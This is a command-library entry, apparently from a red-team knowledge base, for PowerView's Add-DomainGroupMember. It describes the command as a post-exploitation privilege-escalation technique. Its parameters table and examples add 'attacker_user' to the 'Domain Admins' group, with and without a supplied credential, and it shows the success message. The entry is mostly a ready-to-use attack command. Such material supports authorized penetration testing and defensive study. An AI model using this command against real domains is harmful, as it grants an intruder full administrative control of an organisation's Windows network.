---
id: c064f88a-085e-4bc5-bb1a-4e5a40ed0c54
name: powerview-add-domain-group-member
type: command
executor: powershell
data: >-
  Add-DomainGroupMember -Identity '$_GROUP_NAME' -Members '$_TARGET_USER'
  -Credential $_CREDENTIAL
output: >-
  PS C:\> Add-DomainGroupMember -Identity 'Domain Admins' -Members
  'attacker_user'


  Successfully added member 'attacker_user' to group 'Domain Admins'.
created_at: '2020-03-16T01:01:25.836298+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - powerview
  - active-directory
  - group-modification
verified: true
validated: true
---

# powerview-add-domain-group-member

## Command

```powershell
Add-DomainGroupMember -Identity '$_GROUP_NAME' -Members '$_TARGET_USER' -Credential $_CREDENTIAL
```

## Description

This command adds a specified user to a domain group using PowerView's Add-DomainGroupMember function. It is useful in post-exploitation scenarios for privilege escalation by granting additional access to sensitive groups like Domain Admins.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Identity '$_GROUP_NAME' | The name or SID of the target domain group (e.g., 'Domain Admins') | Yes |
| -Members '$_TARGET_USER' | The username or SID of the user to add to the group | Yes |
| -Credential $_CREDENTIAL | A PSCredential object for authentication if not using current context | No |

## Examples

### Basic Usage

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker_user'
```

### Advanced Usage

```powershell
$Cred = Get-Credential
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker_user' -Credential $Cred
```

## Expected Output

When successful, the command returns a confirmation message indicating the member was added. For example:

```
Successfully added member 'attacker_user' to group 'Domain Admins'.
```

If the operation fails (e.g., due to permissions), it will output an error like "Access is denied" or "The specified account already exists."

## Related

- [[procedures/Add-User-to-Active-Directory-Domain-Group]]
- [[tools/PowerView]]
